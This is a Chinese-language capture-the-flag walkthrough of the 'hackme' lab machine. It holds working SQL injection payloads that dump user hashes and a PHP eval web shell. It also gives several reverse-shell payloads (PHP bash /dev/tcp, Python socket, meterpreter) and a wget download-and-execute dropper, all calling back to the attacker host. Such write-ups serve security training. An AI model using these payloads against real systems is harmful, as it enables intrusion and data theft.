# 第7次 heckme靶机

## 1.1 主机发现

```
netdiscover
```

发现主机的ip地址为：

```
192.168.81.144
```

![image-20220318092927760](https://gitee.com/xxb667/img/raw/master/img/image-20220318092927760.png)

## 1.2 端口扫描

```
masscan --rate=1000 -p 0-65535 192.168.81.144
```

可以看到2个端口是开放的

```
22
80
```

![image-20220318093917705](https://gitee.com/xxb667/img/raw/master/img/image-20220318093917705.png)

## 1.3 端口服务识别

```
nmap -sV -T4 -O 192.168.81.144 -p 22,80
```

服务信息如下：

```
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
```

![image-20220318094129163](https://gitee.com/xxb667/img/raw/master/img/image-20220318094129163.png)

## 1.4 御剑扫描

```
192.168.81.144
```

扫到了几个网址

```
http://192.168.81.144/uploads/
http://192.168.81.144/login.php
http://192.168.81.144/login.php
http://192.168.81.144/config.php
http://192.168.81.144/register.php
```

![image-20220318093305081](https://gitee.com/xxb667/img/raw/master/img/image-20220318093305081.png)

网址内对应的信息

```
http://192.168.81.144/uploads/
```

网址打开有个图片，但并未发现有用的信息

![image-20220318094400965](https://gitee.com/xxb667/img/raw/master/img/image-20220318094400965.png)

```
http://192.168.81.144/login.php
```

发现一个登录界面，需要用户名和密码

![image-20220318094534243](https://gitee.com/xxb667/img/raw/master/img/image-20220318094534243.png)

发现可以注册账户，注册个账户进去看看

```
用户名:admin
密码：123456
```

![image-20220318102628244](https://gitee.com/xxb667/img/raw/master/img/image-20220318102628244.png)

登录后网址变成下面这个

```
http://192.168.81.144/welcome.php
```

![image-20220318102727408](https://gitee.com/xxb667/img/raw/master/img/image-20220318102727408.png)

# 2.漏洞探测

## 2.1 SQL注入

登录后的网址，直接点击**search**发现直接出来了数据库中的内容

![image-20220318103125489](https://gitee.com/xxb667/img/raw/master/img/image-20220318103125489.png)

判断是否有sql注入漏洞

```
Windows OS' and 1=1#
```

数据正常显示，说明存在sql注入

![image-20220318105716490](https://gitee.com/xxb667/img/raw/master/img/image-20220318105716490.png)

## 2.2 判断字段数

```
Linux OS' order by 3#
```

数据可以正常显示

![image-20220318110313398](https://gitee.com/xxb667/img/raw/master/img/image-20220318110313398.png)



```
Linux OS' order by 4#
```

数据无法正常显示，说明字段数为3

![image-20220318110503366](https://gitee.com/xxb667/img/raw/master/img/image-20220318110503366.png)

## 2.3 爆库

查看当前数据库

```
-1' union select database(),2,3#
```

得到当前数据库的名称为

```
webapphacking
```

![image-20220318110921205](https://gitee.com/xxb667/img/raw/master/img/image-20220318110921205.png)

## 2.4 爆表

查看webapphacking库所有的表

```
-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='webapphacking'#
```

得到两个数据表

```
books
users
```

![image-20220318111101849](https://gitee.com/xxb667/img/raw/master/img/image-20220318111101849.png)

查看users表中所有的列

```
-1' union select group_concat(column_name),2,3 from information_schema.columns where table_name='users'#
```

得到列名如下：

```
USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,user,pasword,name,address	
```

![image-20220318111236319](https://gitee.com/xxb667/img/raw/master/img/image-20220318111236319.png)

查看表中user,password

```
-1' union select group_concat(user),group_concat(pasword),3 from users#
```

用户名如下：

```
user1
user2
user3
test
superadmin
test1
admin
```

对应的密码如下：

```
5d41402abc4b2a76b9719d911017c592
6269c4f71a55b24bad0f0267d9be5508
0f359740bd1cda994f8b55330c86d845
05a671c66aefea124cc08b76ea6d30bb
2386acb2cf356944177746fc92523983
05a671c66aefea124cc08b76ea6d30bb
e10adc3949ba59abbe56e057f20f883e
```

![image-20220318111411057](https://gitee.com/xxb667/img/raw/master/img/image-20220318111411057.png)

## 2.5 MD5破解密码

```
https://www.somd5.com/
```

破解superadmin的密码

```
2386acb2cf356944177746fc92523983
```

得到的密码如下：

```
Uncrackable
```

![image-20220318111922044](https://gitee.com/xxb667/img/raw/master/img/image-20220318111922044.png)

## 2.6 超级用户登录

用我们刚才得到的账户和密码进行登录

跳转到了下列网址

```
http://192.168.81.144/welcomeadmin.php
```

进去发现我们可以上传图片和文件

![image-20220318112232354](https://gitee.com/xxb667/img/raw/master/img/image-20220318112232354.png)

# 3.getshell的4种方法

## 3-1 MSF反弹shell

### 3-1.1 上传木马文件

一句话木马

```
<?php @eval($_POST["xxb"]);?>
```

保存的文件名为xxb.php

点击 **Upload Image**进行上传

上传后得到路径

```
http://192.168.81.144/uploads
```

![image-20220318112739900](https://gitee.com/xxb667/img/raw/master/img/image-20220318112739900.png)

### 3-1.2 蚁剑连接

```
http://192.168.81.144/uploads/xxb.php
```

密码为：

```
xxb
```

![image-20220318113116069](https://gitee.com/xxb667/img/raw/master/img/image-20220318113116069.png)

### 3-1.3 上传木马文件

MSF生成木马文件，木马文件名为

**4444.elf**

```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.81.131 lport=4444 -f elf  >4444.elf
```

![image-20220318113629623](https://gitee.com/xxb667/img/raw/master/img/image-20220318113629623.png)

### 3-1.4 kali监听

msf进行监听

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.81.131
set LPORT 4444
exploit
```

![image-20220318114013302](https://gitee.com/xxb667/img/raw/master/img/image-20220318114013302.png)

返回蚁剑运行木马文件

```
chmod +x 4444.elf
./4444.elf
```

![image-20220318114138269](https://gitee.com/xxb667/img/raw/master/img/image-20220318114138269.png)

返回kali，已经成功反弹

![image-20220318114234405](https://gitee.com/xxb667/img/raw/master/img/image-20220318114234405.png)

## 3-2 nc_shell反弹shell

php文件，生成的php文件名为：1234.php

然后把php文件通过蚁剑进行上传

```
<?php system("echo 'bash -i >& /dev/tcp/192.168.81.131/1234 0>&1' | bash");?>
```

![image-20220318142834768](https://gitee.com/xxb667/img/raw/master/img/image-20220318142834768.png)



kali服务端监听

```
nc -nvlp 1234
```

蚁剑运行

```
php 1234.php
```

![image-20220318143524951](https://gitee.com/xxb667/img/raw/master/img/image-20220318143524951.png)

进行提权的时候可以切换python终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

或用

```
whoami #查看当前用户权限
```



## 3-3 nc_python反弹shell

python文件,生成的python文件名为: **xxb.py**

把文件通过蚁剑进行上传

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.81.131",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

![image-20220318144041309](https://gitee.com/xxb667/img/raw/master/img/image-20220318144041309.png)

服务端监听

```
nc -nvlp 1234
```

蚁剑运行python文件

```
python 1.py
```

![image-20220318144146483](https://gitee.com/xxb667/img/raw/master/img/image-20220318144146483.png)

进行提权的时候可以切换python终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

或用

```
whoami #查看当前用户权限
```



## 3-4 msf_linux反弹shell

msfvenom生成木马

```
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.81.131 LPORT=4444 -b "\\x00" -i 10 -f elf -o  /var/www/html/linux_shell
```

![image-20220318145204666](https://gitee.com/xxb667/img/raw/master/img/image-20220318145204666.png)

php文件,生成的php文件名为：**linux_shell.php**

通过蚁剑进行文件上传

```
<?php system("wget 192.168.81.131/linux_shell -O /tmp/xiao3;cd /tmp;chmod +x xiao3;./xiao3 &")?>
```

![image-20220318150348384](https://gitee.com/xxb667/img/raw/master/img/image-20220318150348384.png)

创建**linux.rc**文件，并添加下列内容

```
vim linux.rc  #创建文件
```

添加的内容如下

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.81.131
set LPORT 4444
exploit
```

我的文件路径为 

```
/home/xxb1  #可以自己找到合适的路径进行文件建立
```

![image-20220318151533016](https://gitee.com/xxb667/img/raw/master/img/image-20220318151533016.png)

服务端监听

```
msfconsole  -qr /home/xxb1/linux.rc 
```

蚁剑运行上传的php木马文件

```
php linux_shell.php
```

![image-20220318151816282](https://gitee.com/xxb667/img/raw/master/img/image-20220318151816282.png)





# 4.提权

## 4.1 获取shell

```
shell
```

![image-20220318114404810](https://gitee.com/xxb667/img/raw/master/img/image-20220318114404810.png)

## 4.2 切换终端

获取shell后，切换python终端

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20220318114528077](https://gitee.com/xxb667/img/raw/master/img/image-20220318114528077.png)

## 4.3 获得root权限

在home/legacy路径下发现一个文件**touchmenot**

```
cd /home/legacy
```

运行这个文件

```
./touchmenot
```

运行后发现直接获得了root权限

![image-20220318115039486](https://gitee.com/xxb667/img/raw/master/img/image-20220318115039486.png)

# 5.sqlmap应用

## 5.1 获得post文件

- 用burp对网站数据进行抓包
- 获得post文件
- 并把文件中的内容复制，粘贴到一个txt文件里面
- 然后把这个文件复制到kali中
- 并在文件的路径下打开终端运行sqlmap

burp抓包

![image-20220321110438192](https://gitee.com/xxb667/img/raw/master/img/image-20220321110438192.png)

抓取到的内容

```
POST /welcome.php HTTP/1.1
Host: 192.168.81.144
Content-Length: 7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.81.144
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.81.144/welcome.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=mgnutee8r93e52jdres0rsbui4
dnt: 1
sec-gpc: 1
Connection: close

search=*
```

保存的文件名为：**hack.txt**

## 5.2 获得近来数据库用户

```
sqlmap -r hack.txt --current-user --batch --smart --dump
```

--batch：自动获取

--dump：打印

--current-user：获取近来用户

book表中的内容：

![image-20220321110735391](https://gitee.com/xxb667/img/raw/master/img/image-20220321110735391.png)

user表中的内容：

```
1  | David        | user1      | 5d41402abc4b2a76b9719d911017c592 (hello)    | Newton Circles |
| 2  | Beckham      | user2      | 6269c4f71a55b24bad0f0267d9be5508 (commando) | Kensington     |
| 3  | anonymous    | user3      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) | anonymous      |
| 10 | testismyname | test       | 05a671c66aefea124cc08b76ea6d30bb (testtest) | testaddress    |
| 11 | superadmin   | superadmin | 2386acb2cf356944177746fc92523983            | superadmin     |
| 12 | test1        | test1      | 05a671c66aefea124cc08b76ea6d30bb (testtest) | test1          |
| 13 | <blank>      | admin      | e10adc3949ba59abbe56e057f20f883e (123456)   | <blank>        
```

![image-20220321110836721](https://gitee.com/xxb667/img/raw/master/img/image-20220321110836721.png)

